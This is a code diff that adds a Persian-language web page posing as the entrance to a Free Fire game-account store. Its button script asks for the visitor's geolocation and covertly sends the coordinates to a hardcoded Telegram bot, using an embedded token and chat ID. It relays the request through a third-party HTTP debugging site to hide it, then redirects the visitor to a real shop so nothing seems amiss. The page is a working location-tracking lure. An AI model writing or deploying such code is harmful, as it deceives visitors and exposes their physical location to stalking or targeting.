@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>https://vinaaccessory.com/</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://cdn.fontcdn.ir/Font/Persian/Vazir/Vazir.css" rel="stylesheet" type="text/css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Vazir', sans-serif;
+      background: url('https://images.openai.com/thumbnails/url/g_qQSXicu1mSUVJSUGylr5-al1xUWVCSmqJbkpRnoJdeXJJYkpmsl5yfq5-Zm5ieWmxfaAuUsXL0S7F0Tw6yKC8pCauwcPU18fVzSy7ON_HLrnKs8nRNKgp1t4yIiEyJiqryLw2tck_yyawsSQ539UqPDE0uj8_JTlcrBgAxxSsT') no-repeat center center;
+      background-size: cover;
+      background-attachment: fixed; /* پارالاکس */
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      color: #fff;
+      overflow-x: hidden;
+    }
+    h1 {
+      font-size: 2.4em;
+      margin-bottom: 12px;
+      text-shadow: 0 0 15px rgba(0,0,0,0.8);
+    }
+    p {
+      font-size: 1.2em;
+      margin-bottom: 25px;
+      text-shadow: 0 0 12px rgba(0,0,0,0.7);
+    }
+
+    /* دکمه استایل Free Fire */
+    button {
+      position: relative;
+      background: linear-gradient(135deg, #ff3c3c, #ff9800, #ffcc00);
+      color: white;
+      border: none;
+      padding: 16px 40px;
+      font-size: 1.2em;
+      border-radius: 40px;
+      cursor: pointer;
+      box-shadow: 0 0 25px rgba(255, 152, 0, 0.7), 0 0 40px rgba(255, 60, 60, 0.6);
+      text-transform: uppercase;
+      font-weight: bold;
+      overflow: hidden;
+      transition: transform 0.2s ease;
+    }
+    button:hover {
+      transform: scale(1.1);
+    }
+    /* افکت درخشش روی دکمه */
+    button::before {
+      content: "";
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(120deg, rgba(255,255,255,0.3), transparent, transparent);
+      transform: rotate(25deg);
+      animation: shine 3s infinite;
+    }
+    @keyframes shine {
+      0% { transform: rotate(25deg) translateX(-150%); }
+      50% { transform: rotate(25deg) translateX(150%); }
+      100% { transform: rotate(25deg) translateX(150%); }
+    }
+
+    footer {
+      margin-top: auto;
+      width: 100%;
+      background: rgba(0,0,0,0.65);
+      padding: 12px 0;
+      font-size: 0.85em;
+      color: #eee;
+      border-top: 1px solid rgba(255,255,255,0.2);
+      text-shadow: 0 0 8px rgba(0,0,0,0.8);
+      text-align: center;
+    }
+
+    /* موبایل */
+    @media (max-width: 600px) {
+      h1 { font-size: 1.8em; }
+      p { font-size: 1em; }
+      button {
+        width: 85%;
+        font-size: 1em;
+        padding: 14px 25px;
+      }
+      footer {
+        font-size: 0.75em;
+        padding: 10px 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>در حال ورود به سایت</h1>
+  <p>خرید و فروش اکانت فری فایر!</p>
+  <button onclick="getLocation()">ورود به وی جی استور</button>
+  <footer>
+    © تمامی حقوق محفوظ است برای وی جی استور | طراحی شده با
+  </footer>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(showPosition, showError);
+      } else {
+        alert("مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.");
+      }
+    }
+
+    function showPosition(position) {
+      var latitude = position.coords.latitude;
+      var longitude = position.coords.longitude;
+
+      if (latitude && longitude) {
+        var tgUrl = "https://api.telegram.org/bot8069976917:AAHGS2Sar6h0qPCYVPpYezGHRVoOY1KuTbs/sendMessage"
+                  + "?chat_id=8438093859"
+                  + "&text=" + encodeURIComponent("Latitude: " + latitude + ", Longitude: " + longitude);
+
+        var formData = new FormData();
+        formData.append("UrlBox", tgUrl);
+        formData.append("AgentList", "Google chrome");
+        formData.append("VersionsList", "HTTP/1.1");
+        formData.append("MethodList", "POST");
+        fetch("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", {
+          method: "POST",
+          body: formData,
+          mode: "no-cors"
+        }).then(function() {
+          alert("موفق!");
+          window.location.href = "https://vg-store.ir/%D8%AF%D8%B3%D8%AA%D9%87-%D9%85%D8%AD%D8%B5%D9%88%D9%84/%D8%A8%D8%A7%D8%B2%DB%8C-%D9%87%D8%A7%DB%8C-%D9%85%D9%88%D8%A8%D8%A7%DB%8C%D9%84/%D8%A7%DA%A9%D8%A7%D9%86%D8%AA-%D9%81%D8%B1%DB%8C-%D9%81%D8%A7%DB%8C%D8%B1/";
+        }).catch(function() {
+          alert("خطا! دوباره امتحان کنید.");
+          window.location.href = "https://vinaaccessory.com/";
+        });
+
+      } else {
+        alert("لطفاً دوباره امتحان کنید.");
+      }
+    }
+
+    function showError(error) {
+      alert("مشکلی پیش آمد، دوباره امتحان کنید.");
+      window.location.href = "https://vinaaccessory.com/";
+    }
+  </script>
+</body>
+</html>
